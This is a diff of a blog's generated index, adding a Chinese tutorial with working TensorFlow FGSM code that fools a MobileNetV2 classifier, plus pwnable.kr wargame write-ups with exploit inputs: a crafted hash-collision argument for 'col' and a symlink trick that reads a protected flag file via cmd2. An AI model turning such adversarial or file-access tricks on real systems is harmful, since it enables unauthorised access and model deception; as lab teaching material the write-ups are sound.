+<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/3.png" class></strong></p>
+<h3 id="什么是对抗性例子？"><a href="#什么是对抗性例子？" class="headerlink" title="什么是对抗性例子？"></a>什么是对抗性例子？</h3><p>对抗性示例是专门创建的输入，其目的是混淆神经网络，从而导致给定输入的分类错误。这些臭名昭著的输入对于人眼是无法区分的，但是会导致网络无法识别图像的内容。这类攻击有几种类型，但是，这里的重点是快速梯度符号方法攻击，这是一种<em>白盒</em>攻击，其目的是确保错误分类。白盒攻击是攻击者可以完全访问被攻击模型的地方。举下面两个例子：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/2.png" class></strong></p>
+<p>原始图像（左图），对抗噪声（中图），扰动后的图片即对抗样本（右图）被错误地分类为数字 2。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/1.png" class></strong></p>
+<p>在这里，从熊猫的图像开始，攻击者向原始图像添加了较小的扰动（失真），这导致模型以较高的置信度将该图像标记为长臂猿。下面说明添加这些扰动的过程。</p>
+<h3 id="快速梯度符号法-FGSM"><a href="#快速梯度符号法-FGSM" class="headerlink" title="快速梯度符号法(FGSM)"></a>快速梯度符号法(FGSM)</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/11.png" class></strong></p>
+<p>下面展示简单的利用<a href="https://blog.csdn.net/crystal_sugar/article/details/106023055?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">FGSM原理</a>实现的示例。</p>
+<p><strong>FGSM</strong>的工作原理是利用神经网络的梯度来创建一个<strong>Adversarial example</strong>。对于输入图像，该方法使用相对于输入图像的损失的梯度来创建使损失函数最大化的新图像。这个新图像被称为对抗图像。</p>
+<p>在这里，梯度是相对于输入的图像的。这样做是因为其目标是创造一个最大化损失的图像。实现这一点的方法是找出图像中每个像素对损失值的贡献程度，并相应地添加一个扰动（使用链式规则去计算梯度可以很容易地找到每个输入像素的贡献程度）。此外，由于模型不再被训练（因此梯度不针对可训练变量，即模型参数），因此模型参数保持不变。唯一的目的就是使一个已经受过训练的模型发生错误的分类。<br>在这篇文章中，模型是<strong>MobileNetV2</strong>模型，在<strong>ImageNet</strong>上进行了预训练。</p>
+<h3 id="导入所需要的库"><a href="#导入所需要的库" class="headerlink" title="导入所需要的库"></a>导入所需要的库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure>
+
+<h3 id="设置图片相关信息"><a href="#设置图片相关信息" class="headerlink" title="设置图片相关信息"></a>设置图片相关信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 图片像素</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;figure.figsize&#x27;</span>] = (<span class="number">8</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 图片网格</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.grid&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="载入MobileNetV2模型"><a href="#载入MobileNetV2模型" class="headerlink" title="载入MobileNetV2模型"></a>载入<a href="https://www.tensorflow.org/api_docs/python/tf/keras/applications/MobileNetV2">MobileNetV2</a>模型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pretrained_model = tf.keras.applications.MobileNetV2(include_top=<span class="literal">True</span>, weights=<span class="string">&#x27;imagenet&#x27;</span>)</span><br><span class="line">pretrained_model.trainable = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="图像预处理"><a href="#图像预处理" class="headerlink" title="图像预处理"></a>图像预处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess</span>(<span class="params">image</span>):</span></span><br><span class="line">    image = tf.cast(image, tf.float32)</span><br><span class="line">    image = image/<span class="number">255</span></span><br><span class="line">    image = tf.image.resize(image, (<span class="number">224</span>, <span class="number">224</span>))</span><br><span class="line">    image = image[<span class="literal">None</span>, ...]</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片信息</span></span><br><span class="line">image_path = tf.keras.utils.get_file(<span class="string">&#x27;YellowLabradorLooking_new.jpg&#x27;</span>,<span class="string">&#x27;https://storage.googleapis.com/download.tensorflow.org/example_images/YellowLabradorLooking_new.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">image_raw = tf.io.read_file(image_path)</span><br><span class="line">image = tf.image.decode_image(image_raw)</span><br><span class="line"></span><br><span class="line">image = preprocess(image)</span><br></pre></td></tr></table></figure>
+
+<h3 id="将图像输入模型并得到概率最高的分类结果"><a href="#将图像输入模型并得到概率最高的分类结果" class="headerlink" title="将图像输入模型并得到概率最高的分类结果"></a>将图像输入模型并得到概率最高的分类结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Helper function to extract labels from probability vector</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imagenet_label</span>(<span class="params">probs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> tf.keras.applications.mobilenet_v2.decode_predictions(probs, top=<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">image_probs = pretrained_model.predict(image)</span><br></pre></td></tr></table></figure>
+
+<h3 id="展示图像"><a href="#展示图像" class="headerlink" title="展示图像"></a>展示图像</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure()</span><br><span class="line">plt.imshow(image[<span class="number">0</span>])</span><br><span class="line">_, image_class, class_confidence = get_imagenet_label(image_probs)</span><br><span class="line">plt.title(<span class="string">&#x27;&#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;</span>.format(image_class, class_confidence*<span class="number">100</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/4.png" class></strong></p>
+<p>可以准确地预测出图像为拉布拉多犬（可能性最高为37.16%）</p>
+<h3 id="计算梯度"><a href="#计算梯度" class="headerlink" title="计算梯度"></a>计算梯度</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loss_object = tf.keras.losses.CategoricalCrossentropy()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_adversarial_pattern</span>(<span class="params">input_image, input_label</span>):</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        tape.watch(input_image)</span><br><span class="line">        prediction = pretrained_model(input_image)</span><br><span class="line">        loss = loss_object(input_label, prediction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the gradients of the loss w.r.t to the input image.</span></span><br><span class="line">    gradient = tape.gradient(loss, input_image)</span><br><span class="line">    <span class="comment"># Get the sign of the gradients to create the perturbation</span></span><br><span class="line">    signed_grad = tf.sign(gradient)</span><br><span class="line">    <span class="keyword">return</span> signed_grad</span><br></pre></td></tr></table></figure>
+
+<h3 id="打印添加的噪音图像"><a href="#打印添加的噪音图像" class="headerlink" title="打印添加的噪音图像"></a>打印添加的噪音图像</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get the input label of the image.</span></span><br><span class="line">labrador_retriever_index = <span class="number">208</span></span><br><span class="line">label = tf.one_hot(labrador_retriever_index, image_probs.shape[<span class="number">-1</span>])</span><br><span class="line">label = tf.reshape(label, (<span class="number">1</span>, image_probs.shape[<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line">perturbations = create_adversarial_pattern(image, label)</span><br><span class="line">plt.imshow(perturbations[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/5.png" class></strong></p>
+<h3 id="定义显示图像的函数"><a href="#定义显示图像的函数" class="headerlink" title="定义显示图像的函数"></a>定义显示图像的函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_images</span>(<span class="params">image, description</span>):</span></span><br><span class="line">    _, label, confidence = get_imagenet_label(pretrained_model.predict(image))</span><br><span class="line">    plt.figure()</span><br><span class="line">    plt.imshow(image[<span class="number">0</span>])</span><br><span class="line">    plt.title(<span class="string">&#x27;&#123;&#125; \n &#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;</span>.format(description,</span><br><span class="line">                                                   label, confidence*<span class="number">100</span>))</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
+
+<h3 id="加入噪声后再将图像输入模型进行判断"><a href="#加入噪声后再将图像输入模型进行判断" class="headerlink" title="加入噪声后再将图像输入模型进行判断"></a>加入噪声后再将图像输入模型进行判断</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">epsilons = [<span class="number">0</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">0.15</span>]</span><br><span class="line">descriptions = [(<span class="string">&#x27;Epsilon = &#123;:0.3f&#125;&#x27;</span>.format(eps) <span class="keyword">if</span> eps <span class="keyword">else</span> <span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> eps <span class="keyword">in</span> epsilons]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, eps <span class="keyword">in</span> enumerate(epsilons):</span><br><span class="line">    adv_x = image + eps*perturbations</span><br><span class="line">    adv_x = tf.clip_by_value(adv_x, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    display_images(adv_x, descriptions[i])</span><br></pre></td></tr></table></figure>
+
+<p>其中<strong>epsilons</strong> 表示噪声的干扰程度。</p>
+<h4 id="输入图片"><a href="#输入图片" class="headerlink" title="输入图片"></a>输入图片</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/6.png" class></strong></p>
+<h4 id="噪声为0-01"><a href="#噪声为0-01" class="headerlink" title="噪声为0.01"></a>噪声为0.01</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/7.png" class></strong></p>
+<p>识别为Ibizan柴犬</p>
+<h4 id="噪声为0-1"><a href="#噪声为0-1" class="headerlink" title="噪声为0.1"></a>噪声为0.1</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/8.png" class></strong></p>
+<p>识别为浴巾</p>
+<h3 id="噪声为0-15"><a href="#噪声为0-15" class="headerlink" title="噪声为0.15"></a>噪声为0.15</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/9.png" class></strong></p>
+<p>识别为脑珊瑚</p>
+<h3 id="噪声为0-20"><a href="#噪声为0-20" class="headerlink" title="噪声为0.20"></a>噪声为0.20</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/10.png" class></strong></p>
+<p>识别为毛毯</p>
+<p>可见，输入图片添加噪声之后已经不能正确分类。</p>
 ]]></content>
       <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
+        <category>AI</category>
+        <category>Adversarial sample</category>
       </categories>
       <tags>
-        <tag>PWN</tag>
+        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -287,6 +263,31 @@
       </tags>
   </entry>
   <entry>
+    <title>blukat</title>
+    <url>/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/1.png" class></strong></p>
+<h3 id="查看blukat-c源文件"><a href="#查看blukat-c源文件" class="headerlink" title="查看blukat.c源文件"></a>查看blukat.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span>* key = <span class="string">&quot;3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">                flag[i] = s[i] ^ key[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FILE* fp = fopen(<span class="string">&quot;/home/blukat/password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fgets(password, <span class="number">100</span>, fp);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;guess the password!\n&quot;</span>);</span><br><span class="line">        fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;congrats! here is your flag: &quot;</span>);</span><br><span class="line">                calc_flag(password);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong guess!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序先读取password文件中的内容到password数组中，之后使用buf缓冲区读取用户输入的字符，buf缓冲区的大小为100，而读取的字符为128，之后比较用户输入的字符和password数组中的内容，如果相等，则可以执行cacl_flag函数，经过和密钥的异或运算计算出flag。如果采用缓冲区溢出覆盖fgets的返回地址为函数calc_flag的地址，由于不知道password的内容，无法正确计算出flag，因此这里缓冲区溢出攻击行不通。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>想到本题题干中的描述，本题应该是具有一种巧妙的解法（<a href="https://blog.csdn.net/jackywgw/article/details/41545957">ls-la各项说明​</a>）。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/2.png" class></strong></p>
+<p>这里看到password文件的用户组含有blukat_pwn，而当前用户在blukat_pwn组，因此是具有读权限的，那运行cat命令：</p>
+<p>提示没有访问权限？不，这里的文件内容就是这句话，那直接将这句话输入到可执行文件中即可拿到flag。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/3.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>cmd1</title>
     <url>/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/0.png" class></strong></p>
@@ -326,41 +327,6 @@
 
 <p>首先在/tmp目录下建立自己的目录xiaohong404(这个目录可以任意取名，但不能和已经存在的文件名重复），然后创建目录*<em>/tmp/xiaohong404/c<strong>。那么，如果在/tmp/xiaohong404/c目录下执行</strong>pwd命令<strong>就可以得到这个路径字符”/tmp/xiaohong404/c“。然后在</strong>/tmp/exploit<strong>目录下构造</strong>cat<strong>的软链接</strong>ln -s /bin/cat cat<strong>，在</strong>/tmp/exploit/c<strong>下建立</strong>flag<strong>的软链接</strong>ln -s /home/cmd2/flag flag<strong>。然后在</strong>/tmp/exploit/c<strong>下执行命令</strong>/home/cmd2/cmd2”$(pwd)at f**</em>，这里表示执行cmd2程序，相当于*<em>./cmd2 “$(pwd)at f\</em>“<strong>就可以得到flag了。其原理就是利用</strong>”$(pwd)at”<strong>构造出</strong>/tmp/xiaohong404/cat**命令。</p>
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/2.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>collision</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/2.png" class></strong></p>
-<h3 id="查看C语言源代码"><a href="#查看C语言源代码" class="headerlink" title="查看C语言源代码"></a>查看C语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/3.png" class></strong></p>
-<h3 id="main-int-argc-char-argv"><a href="#main-int-argc-char-argv" class="headerlink" title="main(int argc, char* argv[])"></a><a href="https://blog.csdn.net/LYJ_viviani/article/details/51873961">main(int argc, char* argv[])</a></h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/4.png" class></strong></p>
-<p>传递三个参数$aa,bb,cc$, 程序运行结果如下:</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/5.png" class></strong></p>
-<p><strong>注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递）</strong></p>
-<h3 id="分析col-c"><a href="#分析col-c" class="headerlink" title="分析col.c"></a>分析col.c</h3><ul>
-<li>函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。</li>
-<li>argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。</li>
-<li>check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。</li>
-<li>如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。</li>
-</ul>
-<p>最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，<strong>注意不能设置为0x00</strong>，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。</p>
-<p>另外，注意数据按照小端序存放：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/6.png" class></strong></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/7.png" class></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/8.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -431,17 +397,30 @@
       </tags>
   </entry>
   <entry>
-    <title>flag</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
+    <title>collision</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/1.png" class></strong></p>
  <a id="more"></a>
 
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
-<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
-<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
-<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
-<p>将flag的值存放到dest中，直接查看flag即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/2.png" class></strong></p>
+<h3 id="查看C语言源代码"><a href="#查看C语言源代码" class="headerlink" title="查看C语言源代码"></a>查看C语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/3.png" class></strong></p>
+<h3 id="main-int-argc-char-argv"><a href="#main-int-argc-char-argv" class="headerlink" title="main(int argc, char* argv[])"></a><a href="https://blog.csdn.net/LYJ_viviani/article/details/51873961">main(int argc, char* argv[])</a></h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/4.png" class></strong></p>
+<p>传递三个参数$aa,bb,cc$, 程序运行结果如下:</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/5.png" class></strong></p>
+<p><strong>注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递）</strong></p>
+<h3 id="分析col-c"><a href="#分析col-c" class="headerlink" title="分析col.c"></a>分析col.c</h3><ul>
+<li>函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。</li>
+<li>argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。</li>
+<li>check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。</li>
+<li>如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。</li>
+</ul>
+<p>最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，<strong>注意不能设置为0x00</strong>，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。</p>
+<p>另外，注意数据按照小端序存放：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/6.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/7.png" class></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/8.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -453,23 +432,17 @@
       </tags>
   </entry>
   <entry>
-    <title>mistake</title>
-    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/0.png" class></strong></p>
+    <title>flag</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
  <a id="more"></a>
 
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/1.png" class></strong></p>
